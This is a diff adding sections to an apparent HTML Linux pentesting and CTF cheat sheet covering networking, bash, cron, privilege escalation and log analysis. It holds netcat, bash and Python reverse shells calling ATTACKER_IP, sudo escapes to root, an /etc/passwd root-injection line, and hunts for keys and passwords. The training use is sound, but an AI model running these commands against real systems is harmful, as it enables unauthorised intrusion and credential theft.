+<span class="k">netstat</span> <span class="o">-tulpn</span>              <span class="c"># same, older syntax</span>
+<span class="k">ss</span> <span class="o">-tn</span> state established    <span class="c"># active connections</span>
+<span class="k">lsof</span> <span class="o">-i :22</span>                 <span class="c"># what process owns port 22</span>
+
+<span class="c"># ── CONNECTIVITY TESTING ──────────────────────</span>
+<span class="k">ping</span> <span class="o">-c 4</span> 8.8.8.8            <span class="c"># ICMP ping (4 packets)</span>
+<span class="k">traceroute</span> google.com        <span class="c"># hops to destination</span>
+<span class="k">curl</span> <span class="o">-I</span> https://target.com   <span class="c"># HTTP headers only</span>
+<span class="k">wget</span> <span class="o">-q -O-</span> http://target    <span class="c"># download to stdout</span>
+<span class="k">nc</span> <span class="o">-zv</span> 192.168.1.5 80        <span class="c"># test if port 80 is open</span>
+<span class="k">nc</span> <span class="o">-zv</span> 192.168.1.5 20-100    <span class="c"># scan port range</span>
+
+<span class="c"># ── NETCAT — THE SWISS ARMY KNIFE ─────────────</span>
+<span class="k">nc</span> <span class="o">-nlvp</span> <span class="v">4444</span>               <span class="c"># listen for incoming connection</span>
+<span class="k">nc</span> 192.168.1.5 <span class="v">4444</span>         <span class="c"># connect to listener</span>
+<span class="k">nc</span> 192.168.1.5 <span class="v">22</span>           <span class="c"># banner grab SSH</span>
+
+<span class="c"># REVERSE SHELL with netcat:</span>
+nc <span class="o">-nlvp</span> <span class="v">4444</span>                          <span class="c"># attacker listens</span>
+nc <span class="p">ATTACKER_IP</span> <span class="v">4444</span> <span class="o">-e</span> /bin/bash      <span class="c"># victim connects back</span>
+
+<span class="c"># REVERSE SHELL alternatives (if -e not available):</span>
+bash <span class="o">-i</span> &gt;&amp; /dev/tcp/<span class="p">ATTACKER_IP</span>/<span class="v">4444</span> <span class="v">0</span>&gt;&amp;<span class="v">1</span>
+python3 <span class="o">-c</span> <span class="s">'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'</span>
+
+<span class="c"># ── SSH ───────────────────────────────────────</span>
+<span class="k">ssh</span> rudra@192.168.1.5              <span class="c"># connect</span>
+<span class="k">ssh</span> <span class="o">-i</span> ~/.ssh/id_rsa user@host    <span class="c"># with key</span>
+<span class="k">ssh</span> <span class="o">-p 2222</span> user@host            <span class="c"># custom port</span>
+<span class="k">ssh</span> <span class="o">-L 8080:localhost:80</span> user@host <span class="c"># local port forward</span>
+<span class="k">ssh</span> <span class="o">-R 4444:localhost:4444</span> user@host <span class="c"># remote port forward</span>
+<span class="k">ssh</span> <span class="o">-D 9050</span> user@host            <span class="c"># SOCKS proxy (for proxychains)</span>
+
+<span class="c"># FILE TRANSFER ───────────────────────────────</span>
+<span class="k">scp</span> file.txt user@host:/tmp/       <span class="c"># secure copy</span>
+<span class="k">scp</span> <span class="o">-r</span> dir/ user@host:/tmp/       <span class="c"># recursive</span>
+<span class="k">rsync</span> <span class="o">-av</span> src/ user@host:dest/    <span class="c"># sync directories</span>
+
+<span class="c"># Python web server (quick file transfer):</span>
+python3 <span class="o">-m</span> http.server <span class="v">8080</span>       <span class="c"># serve current dir</span>
+curl <span class="p">http://ATTACKER:8080/file</span> <span class="o">-o</span> /tmp/file  <span class="c"># victim downloads</span></pre>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- S9: BASH SCRIPTING -->
+<!-- ══════════════════════════════════════════ -->
+<section class="section" id="s9">
+  <div class="sec-header">
+    <div class="sec-num">09</div>
+    <div class="sec-meta">
+      <h2>BASH SCRIPTING</h2>
+      <p>Automating tasks, writing recon scripts, and understanding scripts you encounter during pentests.</p>
+    </div>
+  </div>
+
+  <div class="card open-default">
+    <div class="card-head"><h3>Script Anatomy & Variables</h3><div class="card-tags"><span class="ctag ctag-b">scripting</span></div></div>
+    <div class="card-body">
+      <div class="code">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div>
+        <pre><span class="c">#!/bin/bash</span>         <span class="c"># shebang — tells OS which interpreter to use</span>
+<span class="c"># Script: recon.sh</span>
+<span class="c"># Usage: ./recon.sh 192.168.1.5</span>
+
+<span class="c"># ── VARIABLES ────────────────────────────────</span>
+<span class="n">TARGET</span>=<span class="s">"$1"</span>          <span class="c"># $1 = first argument, $2 = second, etc.</span>
+<span class="n">PORT</span>=<span class="v">80</span>
+<span class="n">NAME</span>=<span class="s">"rudra"</span>
+<span class="n">DATE</span>=$(<span class="k">date</span> +%Y%m%d)  <span class="c"># command substitution</span>
+<span class="n">RESULT</span>=$(<span class="k">ping</span> <span class="o">-c1</span> <span class="v">$TARGET</span> <span class="v">2</span>&gt;&amp;<span class="v">1</span>)
+
+<span class="c"># ── SPECIAL VARIABLES ─────────────────────────</span>
+<span class="c"># $0   = script name</span>
+<span class="c"># $1-9 = positional arguments</span>
+<span class="c"># $@   = all arguments as array</span>
+<span class="c"># $#   = number of arguments</span>
+<span class="c"># $?   = exit status of last command (0=success)</span>
+<span class="c"># $$   = current PID</span>
+<span class="c"># $!   = PID of last background process</span>
+
+<span class="c"># ── ARRAYS ────────────────────────────────────</span>
+<span class="n">PORTS</span>=(<span class="v">22</span> <span class="v">80</span> <span class="v">443</span> <span class="v">8080</span>)
+echo <span class="v">${PORTS[0]}</span>        <span class="c"># first element: 22</span>
+echo <span class="v">${PORTS[@]}</span>        <span class="c"># all elements</span>
+echo <span class="v">${#PORTS[@]}</span>       <span class="c"># array length</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" id="c-flow">
+    <div class="card-head" onclick="toggle('c-flow')"><h3>Control Flow — if, for, while, case</h3><div class="card-tags"><span class="ctag ctag-b">scripting</span></div><span class="card-chevron">▾</span></div>
+    <div class="card-body">
+      <div class="code">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># ── IF / ELIF / ELSE ─────────────────────────</span>
+<span class="k">if</span> [ <span class="v">$# -eq 0</span> ]; <span class="k">then</span>
+    echo <span class="s">"Usage: $0 &lt;target&gt;"</span>; <span class="k">exit</span> <span class="v">1</span>
+<span class="k">elif</span> [ <span class="v">$# -eq 1</span> ]; <span class="k">then</span>
+    echo <span class="s">"One argument: $1"</span>
+<span class="k">else</span>
+    echo <span class="s">"Multiple arguments"</span>
+<span class="k">fi</span>
+
+<span class="c"># Common test conditions:</span>
+<span class="c"># [ -f file ]  = file exists and is regular file</span>
+<span class="c"># [ -d dir ]   = directory exists</span>
+<span class="c"># [ -r file ]  = file is readable</span>
+<span class="c"># [ -z "$v" ]  = variable is empty</span>
+<span class="c"># [ "$a" == "$b" ] = string equality</span>
+<span class="c"># [ $n -gt 10 ]    = numeric: greater than</span>
+<span class="c"># [ $n -eq 0 ]     = numeric: equal</span>
+
+<span class="c"># ── FOR LOOP ──────────────────────────────────</span>
+<span class="k">for</span> <span class="n">port</span> <span class="k">in</span> <span class="v">22</span> <span class="v">80</span> <span class="v">443</span> <span class="v">8080</span>; <span class="k">do</span>
+    nc <span class="o">-zv</span> <span class="v">$TARGET $port</span> <span class="v">2</span>&gt;&amp;<span class="v">1</span> && echo <span class="s">"OPEN: $port"</span>
+<span class="k">done</span>
+
+<span class="c"># Loop over range:</span>
+<span class="k">for</span> <span class="n">i</span> <span class="k">in</span> {<span class="v">1</span>..<span class="v">254</span>}; <span class="k">do</span>
+    ping <span class="o">-c1 -W1</span> <span class="s">"192.168.1.$i"</span> &gt;/dev/null && echo <span class="s">"UP: 192.168.1.$i"</span>
+<span class="k">done</span>
+
+<span class="c"># Loop over lines in file:</span>
+<span class="k">while</span> IFS= <span class="k">read</span> <span class="o">-r</span> <span class="n">line</span>; <span class="k">do</span>
+    echo <span class="s">"Processing: $line"</span>
+<span class="k">done</span> &lt; wordlist.txt
+
+<span class="c"># ── WHILE LOOP ────────────────────────────────</span>
+<span class="n">count</span>=<span class="v">0</span>
+<span class="k">while</span> [ <span class="v">$count -lt 5</span> ]; <span class="k">do</span>
+    echo <span class="s">"Count: $count"</span>
+    (( <span class="n">count</span>++ ))
+<span class="k">done</span>
+
+<span class="c"># ── CASE ──────────────────────────────────────</span>
+<span class="k">case</span> <span class="v">$1</span> <span class="k">in</span>
+    scan)   nmap <span class="o">-sV</span> <span class="v">$2</span> ;;
+    brute)  hydra <span class="v">$2</span> <span class="o">-l admin -P</span> rockyou.txt ssh ;;
+    *)      echo <span class="s">"Unknown: $1"</span> ;;
+<span class="k">esac</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" id="c-script-example">
+    <div class="card-head" onclick="toggle('c-script-example')"><h3>Complete Script — Port Scanner & Recon Tool</h3><div class="card-tags"><span class="ctag ctag-r">real example</span></div><span class="card-chevron">▾</span></div>
+    <div class="card-body">
+      <div class="code">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash — recon.sh</span><button class="copy-btn" onclick="cp(this)">copy</button></div>
+        <pre><span class="c">#!/bin/bash</span>
+<span class="c"># Simple recon script — safe, for your own systems</span>
+
+<span class="k">RED</span>=<span class="s">'\033[0;31m'</span>; <span class="k">GREEN</span>=<span class="s">'\033[0;32m'</span>; <span class="k">AMBER</span>=<span class="s">'\033[0;33m'</span>; <span class="k">NC</span>=<span class="s">'\033[0m'</span>
+
+<span class="f">banner</span>() {
+    echo <span class="o">-e</span> <span class="s""\n${AMBER}═══════════════════════════${NC}"</span>
+    echo <span class="o">-e</span> <span class="s"" ${GREEN}RECON SCRIPT v1.0${NC}"</span>
+    echo <span class="o">-e</span> <span class="s"" Target: ${RED}$TARGET${NC}"</span>
+    echo <span class="o">-e</span> <span class="s"" Date  : $(date)${NC}"</span>
+    echo <span class="o">-e</span> <span class="s""\n${AMBER}═══════════════════════════${NC}\n"</span>
+}
+
+<span class="f">check_arg</span>() {
+    <span class="k">if</span> [ <span class="v">$# -eq 0</span> ]; <span class="k">then</span>
+        echo <span class="o">-e</span> <span class="s">"${RED}Usage: $0 &lt;target_ip&gt;${NC}"</span>; <span class="k">exit</span> <span class="v">1</span>
+    <span class="k">fi</span>
+}
+
+<span class="f">ping_check</span>() {
+    echo <span class="s">"[*] Checking if host is alive..."</span>
+    <span class="k">if</span> ping <span class="o">-c1 -W2</span> <span class="v">$TARGET</span> &gt;/dev/null <span class="v">2</span>&gt;&amp;<span class="v">1</span>; <span class="k">then</span>
+        echo <span class="o">-e</span> <span class="s">"${GREEN}[+] Host is UP${NC}"</span>
+    <span class="k">else</span>
+        echo <span class="o">-e</span> <span class="s">"${RED}[-] Host may be DOWN (or blocking ICMP)${NC}"</span>
+    <span class="k">fi</span>
+}
+
+<span class="f">port_scan</span>() {
+    echo <span class="s">"\n[*] Scanning common ports..."</span>
+    <span class="k">for</span> <span class="n">port</span> <span class="k">in</span> <span class="v">21</span> <span class="v">22</span> <span class="v">23</span> <span class="v">25</span> <span class="v">53</span> <span class="v">80</span> <span class="v">110</span> <span class="v">443</span> <span class="v">445</span> <span class="v">3306</span> <span class="v">3389</span> <span class="v">8080</span>; <span class="k">do</span>
+        timeout <span class="v">1</span> bash <span class="o">-c</span> <span class="s">"echo &gt;/dev/tcp/$TARGET/$port"</span> <span class="v">2</span>&gt;/dev/null && \
+            echo <span class="o">-e</span> <span class="s">"${GREEN}  [OPEN]${NC} $port"</span> || \
+            echo <span class="o">-e</span> <span class="s">"${RED}  [----]${NC} $port"</span>
+    <span class="k">done</span>
+}
+
+<span class="f">dns_lookup</span>() {
+    echo <span class="s">"\n[*] DNS lookup..."</span>
+    <span class="n">HOST</span>=$(<span class="k">host</span> <span class="v">$TARGET</span> <span class="v">2</span>&gt;/dev/null | <span class="k">awk</span> <span class="s">'{print $NF}'</span>)
+    echo <span class="s">"    Hostname: ${HOST:-unknown}"</span>
+}
+
+<span class="c"># ── MAIN ──────────────────────────────────────</span>
+check_arg <span class="v">$@</span>
+<span class="n">TARGET</span>=<span class="v">$1</span>
+banner
+ping_check
+dns_lookup
+port_scan
+echo <span class="o">-e</span> <span class="s">"\n[*] Done. Run nmap -sV -sC $TARGET for full scan."</span></pre>
+      </div>
+      <div class="code" style="margin-top:8px">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">usage</span></div>
+        <pre>chmod +x recon.sh
+./recon.sh 192.168.1.5</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- S10: CRON & AUTOMATION -->
+<!-- ══════════════════════════════════════════ -->
+<section class="section" id="s10">
+  <div class="sec-header">
+    <div class="sec-num">10</div>
+    <div class="sec-meta">
+      <h2>CRON & AUTOMATION</h2>
+      <p>Scheduled tasks — a common privilege escalation vector when misconfigured.</p>
+    </div>
+  </div>
+
+  <div class="diagram"><span class="dh">CRON SYNTAX:  minute  hour  day  month  weekday  command</span>
+
+<span class="dg">*  *  *  *  *</span>  /path/to/command    <span class="dd">← every minute</span>
+<span class="dg">0  *  *  *  *</span>  backup.sh           <span class="dd">← every hour on the hour</span>
+<span class="dg">0  2  *  *  *</span>  backup.sh           <span class="dd">← 2 AM daily</span>
+<span class="dg">0  2  *  *  0</span>  weekly.sh           <span class="dd">← 2 AM every Sunday (0=Sun)</span>
+<span class="dg">*/5 * * * *</span>    monitor.sh          <span class="dd">← every 5 minutes</span>
+<span class="dg">0  0  1  *  *</span>  monthly.sh          <span class="dd">← midnight 1st of every month</span>
+<span class="dg">@reboot</span>         startup.sh          <span class="dd">← at every boot</span>
+
+<span class="dd">ranges: 1-5  |  lists: 1,3,5  |  step: */5</span></div>
+
+  <div class="code">
+    <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash — cron management</span><button class="copy-btn" onclick="cp(this)">copy</button></div>
+    <pre><span class="c"># ── MANAGING CRONTABS ─────────────────────────</span>
+<span class="k">crontab</span> <span class="o">-e</span>              <span class="c"># edit YOUR crontab</span>
+<span class="k">crontab</span> <span class="o">-l</span>              <span class="c"># list YOUR scheduled tasks</span>
+<span class="k">crontab</span> <span class="o">-r</span>              <span class="c"># remove all your cron jobs</span>
+sudo <span class="k">crontab</span> <span class="o">-u root -l</span> <span class="c"># list root's cron jobs</span>
+
+<span class="c"># ── LOCATIONS TO CHECK (PRIVESC) ──────────────</span>
+<span class="k">cat</span> /etc/crontab               <span class="c"># system-wide crontab</span>
+<span class="k">ls</span> <span class="o">-la</span> /etc/cron.d/           <span class="c"># drop-in cron files</span>
+<span class="k">ls</span> <span class="o">-la</span> /etc/cron.daily/       <span class="c"># daily scripts</span>
+<span class="k">ls</span> <span class="o">-la</span> /etc/cron.hourly/      <span class="c"># hourly scripts</span>
+<span class="k">cat</span> /var/spool/cron/crontabs/* <span class="c"># all user crontabs (root only)</span></pre>
+  </div>
+
+  <div class="note note-r">
+    <div class="note-label">PrivEsc — Cron Path Hijack</div>
+    If a cron job runs <code>/opt/scripts/backup.sh</code> and that file is <strong>world-writable</strong>, you can overwrite it with a reverse shell. Also check if cron uses relative paths (PATH hijack): cron runs <code>backup</code> without full path, and your writable <code>$PATH</code> directory comes first.
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- S11: PACKAGE MANAGEMENT -->
+<!-- ══════════════════════════════════════════ -->
+<section class="section" id="s11">
+  <div class="sec-header">
+    <div class="sec-num">11</div>
+    <div class="sec-meta">
+      <h2>PACKAGE MANAGEMENT</h2>
+      <p>Installing, updating, and managing software — across Debian/Ubuntu (apt) and Red Hat (yum/dnf) families.</p>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="mini">
+      <h4>APT — Debian/Ubuntu/Kali</h4>
+      <div class="code" style="margin-top:8px">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div>
+        <pre>sudo <span class="k">apt update</span>            <span class="c"># refresh package lists</span>
+sudo <span class="k">apt upgrade</span>           <span class="c"># upgrade all packages</span>
+sudo <span class="k">apt install</span> nmap       <span class="c"># install</span>
+sudo <span class="k">apt remove</span> nmap        <span class="c"># remove (keep config)</span>
+sudo <span class="k">apt purge</span> nmap         <span class="c"># remove + config</span>
+sudo <span class="k">apt autoremove</span>        <span class="c"># remove unused deps</span>
+<span class="k">apt search</span> wireshark       <span class="c"># search packages</span>
+<span class="k">apt show</span> nmap              <span class="c"># package info</span>
+<span class="k">dpkg -l</span>                    <span class="c"># list all installed</span>
+<span class="k">dpkg -L</span> nmap               <span class="c"># files from package</span>
+<span class="k">dpkg -S</span> /usr/bin/nmap      <span class="c"># which package owns file</span></pre>
+      </div>
+    </div>
+    <div class="mini">
+      <h4>YUM/DNF — RHEL/CentOS/Fedora</h4>
+      <div class="code" style="margin-top:8px">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div>
+        <pre>sudo <span class="k">yum update</span>            <span class="c"># update all</span>
+sudo <span class="k">yum install</span> nmap       <span class="c"># install</span>
+sudo <span class="k">yum remove</span> nmap        <span class="c"># remove</span>
+sudo <span class="k">dnf install</span> nmap       <span class="c"># newer Fedora/RHEL</span>
+<span class="k">rpm -qa</span>                    <span class="c"># list all installed RPMs</span>
+<span class="k">rpm -qi</span> nmap               <span class="c"># package info</span>
+<span class="k">rpm -ql</span> nmap               <span class="c"># files in package</span>
+<span class="k">rpm -qf</span> /usr/bin/nmap      <span class="c"># which package owns file</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- S12: SECURITY & PRIVESC -->
+<!-- ══════════════════════════════════════════ -->
+<section class="section" id="s12">
+  <div class="sec-header">
+    <div class="sec-num">12</div>
+    <div class="sec-meta">
+      <h2>LINUX SECURITY & PRIVILEGE ESCALATION</h2>
+      <p>Every technique used to enumerate, find weaknesses, and escalate from low-privileged user to root.</p>
+    </div>
+  </div>
+
+  <div class="note note-r">
+    <div class="note-label">The PrivEsc Mindset</div>
+    When you land on a box, always ask: <strong>What can I read? What can I write? What can I execute as someone else?</strong> These three questions cover 90% of privilege escalation.
+  </div>
+
+  <div class="card open-default">
+    <div class="card-head"><h3>Complete Enumeration Checklist</h3><div class="card-tags"><span class="ctag ctag-r">privesc</span></div></div>
+    <div class="card-body">
+      <div class="code">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash — run these immediately on shell access</span><button class="copy-btn" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># ── WHO AM I? ────────────────────────────────</span>
+<span class="k">id</span>                               <span class="c"># uid, gid, groups</span>
+<span class="k">whoami</span>
+<span class="k">sudo</span> <span class="o">-l</span>                          <span class="c"># CRITICAL: sudo permissions</span>
+
+<span class="c"># ── SYSTEM INFO ──────────────────────────────</span>
+<span class="k">uname</span> <span class="o">-a</span>                         <span class="c"># kernel version (check for kernel exploits)</span>
+<span class="k">cat</span> /etc/os-release              <span class="c"># OS version</span>
+<span class="k">cat</span> /proc/version
+<span class="k">hostname</span>
+
+<span class="c"># ── USERS ─────────────────────────────────────</span>
+<span class="k">cat</span> /etc/passwd | <span class="k">grep</span> <span class="o">-v</span> nologin  <span class="c"># users with shells</span>
+<span class="k">cat</span> /etc/group                   <span class="c"># all groups</span>
+<span class="k">cat</span> /etc/shadow                  <span class="c"># hashes (if readable!)</span>
+<span class="k">last</span>                             <span class="c"># login history</span>
+
+<span class="c"># ── SUID / SGID ─────────────────────────────</span>
+<span class="k">find</span> / <span class="o">-perm -u=s -type f</span> <span class="v">2</span>&gt;/dev/null     <span class="c"># SUID files</span>
+<span class="k">find</span> / <span class="o">-perm -g=s -type f</span> <span class="v">2</span>&gt;/dev/null     <span class="c"># SGID files</span>
+
+<span class="c"># ── SUDO ABUSE ──────────────────────────────</span>
+sudo <span class="o">-l</span>
+<span class="c"># If you see: (ALL) NOPASSWD: /usr/bin/find</span>
+sudo find . <span class="o">-exec</span> /bin/bash \; <span class="o">-quit</span>     <span class="c"># → root shell!</span>
+<span class="c"># If you see: (ALL) NOPASSWD: /usr/bin/vim</span>
+sudo vim <span class="o">-c</span> <span class="s">':!/bin/bash'</span>                 <span class="c"># → root shell!</span>
+<span class="c"># If you see: (ALL) NOPASSWD: /usr/bin/less</span>
+sudo less /etc/passwd           <span class="c"># then type: !/bin/bash</span>
+
+<span class="c"># ── CRON JOBS ───────────────────────────────</span>
+<span class="k">cat</span> /etc/crontab
+<span class="k">ls</span> <span class="o">-la</span> /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
+<span class="k">cat</span> /var/spool/cron/crontabs/* <span class="v">2</span>&gt;/dev/null
+
+<span class="c"># ── WRITABLE FILES ──────────────────────────</span>
+<span class="k">find</span> / <span class="o">-writable -type f</span> <span class="v">2</span>&gt;/dev/null | <span class="k">grep</span> <span class="o">-v</span> <span class="s">"/proc\|/sys"</span>
+<span class="k">find</span> / <span class="o">-writable -type d</span> <span class="v">2</span>&gt;/dev/null | <span class="k">grep</span> <span class="o">-v</span> <span class="s">"/proc\|/sys"</span>
+
+<span class="c"># ── SENSITIVE FILES ─────────────────────────</span>
+<span class="k">find</span> / <span class="o">-name</span> <span class="s">"*.conf" -readable</span> <span class="v">2</span>&gt;/dev/null
+<span class="k">find</span> / <span class="o">-name</span> <span class="s">"id_rsa" -o -name "id_ecdsa"</span> <span class="v">2</span>&gt;/dev/null
+<span class="k">find</span> / <span class="o">-name</span> <span class="s">".bash_history" -readable</span> <span class="v">2</span>&gt;/dev/null
+<span class="k">grep</span> <span class="o">-r</span> <span class="s">"password"</span> /home/ <span class="v">2</span>&gt;/dev/null
+<span class="k">cat</span> ~/.bash_history                    <span class="c"># previous commands — passwords!</span>
+<span class="k">env</span>                                    <span class="c"># environment variables (API keys!)</span>
+
+<span class="c"># ── NETWORK ─────────────────────────────────</span>
+<span class="k">ip</span> addr; <span class="k">ip</span> route                     <span class="c"># interfaces and routes</span>
+<span class="k">ss</span> <span class="o">-tulpn</span>                             <span class="c"># listening ports (internal services?)</span>
+<span class="k">cat</span> /etc/hosts                         <span class="c"># internal hosts</span>
+<span class="k">cat</span> /etc/resolv.conf                   <span class="c"># DNS config</span>
+
+<span class="c"># ── CAPABILITIES ─────────────────────────────</span>
+<span class="k">getcap</span> <span class="o">-r /</span> <span class="v">2</span>&gt;/dev/null               <span class="c"># files with capabilities</span>
+<span class="c"># cap_setuid+ep on python → root shell!</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" id="c-gtfo">
+    <div class="card-head" onclick="toggle('c-gtfo')"><h3>GTFOBins — Common SUID/Sudo Exploits</h3><div class="card-tags"><span class="ctag ctag-r">privesc</span></div><span class="card-chevron">▾</span></div>
+    <div class="card-body">
+      <table class="dt">
+        <tr><th>Binary</th><th>SUID / sudo -l shows</th><th>Root Shell Command</th></tr>
+        <tr><td class="mono-cell">bash</td><td>SUID or sudo bash</td><td class="mono-cell">bash -p &nbsp;/&nbsp; sudo bash</td></tr>
+        <tr><td class="mono-cell">find</td><td>sudo find</td><td class="mono-cell">sudo find . -exec /bin/bash \; -quit</td></tr>
+        <tr><td class="mono-cell">vim</td><td>sudo vim</td><td class="mono-cell">sudo vim -c ':!/bin/bash'</td></tr>
+        <tr><td class="mono-cell">less</td><td>sudo less</td><td class="mono-cell">sudo less /etc/passwd then !/bin/bash</td></tr>
+        <tr><td class="mono-cell">python3</td><td>sudo python3</td><td class="mono-cell">sudo python3 -c 'import os; os.system("/bin/bash")'</td></tr>
+        <tr><td class="mono-cell">perl</td><td>sudo perl</td><td class="mono-cell">sudo perl -e 'exec "/bin/bash"'</td></tr>
+        <tr><td class="mono-cell">awk</td><td>sudo awk</td><td class="mono-cell">sudo awk 'BEGIN {system("/bin/bash")}'</td></tr>
+        <tr><td class="mono-cell">nmap</td><td>sudo nmap (old)</td><td class="mono-cell">sudo nmap --interactive then !sh</td></tr>
+        <tr><td class="mono-cell">nano</td><td>sudo nano</td><td class="mono-cell">Ctrl+R Ctrl+X then reset; sh 1>&0 2>&0</td></tr>
+        <tr><td class="mono-cell">cp</td><td>sudo cp</td><td class="mono-cell">echo 'root::0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd</td></tr>
+      </table>
+      <div class="note note-b"><div class="note-label">Reference</div>Full list at <strong>gtfobins.github.io</strong> — every binary imaginable with multiple techniques (file read, file write, SUID, sudo, command, reverse shell).</div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- S13: LOG ANALYSIS -->
+<!-- ══════════════════════════════════════════ -->
+<section class="section" id="s13">
+  <div class="sec-header">
+    <div class="sec-num">13</div>
+    <div class="sec-meta">
+      <h2>LOG ANALYSIS</h2>
+      <p>Reading system logs to detect attacks, understand what happened, and cover or uncover tracks.</p>
+    </div>
+  </div>
+
+  <table class="dt">
+    <tr><th>Log File</th><th>Contains</th><th>Key for</th></tr>
+    <tr><td class="mono-cell">/var/log/auth.log</td><td>Auth events: SSH logins, sudo, su, PAM</td><td>Detecting brute force, lateral movement</td></tr>
+    <tr><td class="mono-cell">/var/log/syslog</td><td>General system messages, daemons</td><td>Crash analysis, service restarts</td></tr>
+    <tr><td class="mono-cell">/var/log/kern.log</td><td>Kernel messages, hardware events</td><td>Kernel exploits, device issues</td></tr>
+    <tr><td class="mono-cell">/var/log/dpkg.log</td><td>Package install/remove history</td><td>What was installed on the box?</td></tr>
+    <tr><td class="mono-cell">/var/log/nginx/access.log</td><td>HTTP requests: IP, method, URL, status</td><td>Web attack detection, recon detection</td></tr>
+    <tr><td class="mono-cell">/var/log/nginx/error.log</td><td>Web server errors</td><td>Attack fingerprinting</td></tr>
+    <tr><td class="mono-cell">/var/log/mysql/error.log</td><td>Database errors</td><td>SQL injection detection</td></tr>
+    <tr><td class="mono-cell">/root/.bash_history</td><td>Commands run as root</td><td>Attacker's activity trail</td></tr>
+  </table>
+
+  <div class="code">
+    <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash — log analysis commands</span><button class="copy-btn" onclick="cp(this)">copy</button></div>
+    <pre><span class="c"># ── AUTH LOG ANALYSIS ─────────────────────────</span>
+<span class="k">grep</span> <span class="s">"Failed password"</span> /var/log/auth.log | <span class="k">tail</span> <span class="o">-20</span>
+<span class="k">grep</span> <span class="s">"Accepted password"</span> /var/log/auth.log      <span class="c"># successful logins</span>
+<span class="k">grep</span> <span class="s">"sudo"</span> /var/log/auth.log | <span class="k">grep</span> <span class="s">"COMMAND"</span>   <span class="c"># sudo usage</span>
+
+<span class="c"># Count failed login attempts per IP:</span>
+<span class="k">grep</span> <span class="s">"Failed password"</span> /var/log/auth.log | <span class="k">awk</span> <span class="s">'{print $11}'</span> | <span class="k">sort</span> | <span class="k">uniq</span> <span class="o">-c</span> | <span class="k">sort</span> <span class="o">-rn</span> | <span class="k">head</span> <span class="o">-10</span>
+
+<span class="c"># ── WEB LOG ANALYSIS ──────────────────────────</span>
+<span class="k">tail</span> <span class="o">-f</span> /var/log/nginx/access.log           <span class="c"># live monitor</span>
+<span class="k">grep</span> <span class="s">" 4[0-9][0-9] "</span> /var/log/nginx/access.log  <span class="c"># 4xx errors</span>
+<span class="k">grep</span> <span class="s">"sqlmap\|nikto\|nmap"</span> /var/log/nginx/access.log  <span class="c"># scanner fingerprints</span>
+
+<span class="c"># Suspicious URL patterns (SQLi / path traversal / XSS):</span>
+<span class="k">grep</span> <span class="o">-E</span> <span class="s">"union.*select|%27|script.*alert|\.\./\.\."</span> /var/log/nginx/access.log
+
+<span class="c"># Top IPs by request count:</span>
+<span class="k">awk</span> <span class="s">'{print $1}'</span> /var/log/nginx/access.log | <span class="k">sort</span> | <span class="k">uniq</span> <span class="o">-c</span> | <span class="k">sort</span> <span class="o">-rn</span> | <span class="k">head</span> <span class="o">-10</span>
+
+<span class="c"># ── LIVE MONITORING ───────────────────────────</span>
+<span class="k">tail</span> <span class="o">-f</span> /var/log/auth.log /var/log/syslog   <span class="c"># follow multiple logs</span>
+<span class="k">journalctl</span> <span class="o">-f</span>                              <span class="c"># systemd journal (live)</span>
+<span class="k">journalctl</span> <span class="o">-u sshd --since "1 hour ago"</span>   <span class="c"># specific service + time</span>
+<span class="k">dmesg</span> <span class="o">-T</span> | <span class="k">tail</span> <span class="o">-20</span>                       <span class="c"># kernel ring buffer</span></pre>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- S14: QUICK REFERENCE -->
+<!-- ══════════════════════════════════════════ -->
+<section class="section" id="s14">
+  <div class="sec-header">
+    <div class="sec-num">14</div>
+    <div class="sec-meta">
+      <h2>QUICK REFERENCE CARD</h2>
+      <p>The commands you need instantly — one-stop cheatsheet for CTFs and pentests.</p>
+    </div>
+  </div>
+
+  <div class="g3">
+    <div class="mini">
+      <h4>🔍 First 60 Seconds on a Box</h4>
+      <div class="code" style="margin-top:8px">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span></div>
+        <pre style="font-size:11px">id; whoami
+sudo -l
+uname -a
+cat /etc/os-release
+hostname; ip addr
+ss -tulpn
+cat /etc/passwd | grep -v nologin
